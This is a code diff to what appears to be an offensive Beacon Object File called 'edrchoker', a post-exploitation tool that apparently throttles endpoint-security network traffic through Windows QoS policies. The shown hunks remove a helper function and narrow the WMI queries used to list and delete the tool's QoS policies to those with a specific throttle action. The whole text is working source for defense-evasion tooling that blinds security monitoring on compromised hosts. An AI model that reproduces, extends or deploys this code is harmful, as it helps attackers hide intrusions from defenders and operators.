@@ -127,12 +127,6 @@ static HRESULT PutBstr(IWbemClassObject* o, const wchar_t* p, const wchar_t* v) 
     HRESULT hr = o->lpVtbl->Put(o, p, 0, &var, 0);
     OLEAUT32$VariantClear(&var); return hr;
 }
-static HRESULT PutI4(IWbemClassObject* o, const wchar_t* p, LONG v) {
-    VARIANT var; OLEAUT32$VariantInit(&var);
-    var.vt = VT_I4; var.lVal = v;
-    HRESULT hr = o->lpVtbl->Put(o, p, 0, &var, 0);
-    OLEAUT32$VariantClear(&var); return hr;
-}
 static HRESULT PutByte(IWbemClassObject* o, const wchar_t* p, BYTE v) {
     VARIANT var; OLEAUT32$VariantInit(&var);
     var.vt = VT_UI1; var.bVal = v;
@@ -431,7 +425,7 @@ static void ListPolicies(IWbemServices* svc, IWbemServices* sub) {
     /* ── QoS policies (ROOT\StandardCimv2) ─────────────────────────────── */
     BSTR lang  = OLEAUT32$SysAllocString(L"WQL");
     BSTR query = OLEAUT32$SysAllocString(
-        L"SELECT * FROM MSFT_NetQosPolicySettingData");
+        L"SELECT * FROM MSFT_NetQosPolicySettingData WHERE ThrottleRateAction = '8'");
     IEnumWbemClassObject* en = NULL;
     svc->lpVtbl->ExecQuery(svc, lang, query,
         WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &en);
@@ -682,7 +676,7 @@ void go(char* args, int len) {
         IWbemServices* pSvc = WmiConnect(pLoc, L"ROOT\\StandardCimv2");
         if (pSvc) {
             int n = ExecDeleteQuery(pSvc,
-                L"SELECT * FROM MSFT_NetQosPolicySettingData");
+                L"SELECT * FROM MSFT_NetQosPolicySettingData WHERE ThrottleRateAction = '8'");
             BeaconPrintf(CALLBACK_OUTPUT,
                 "[edrchoker] %d QoS policy(s) removed\n", n);
             pSvc->lpVtbl->Release(pSvc);
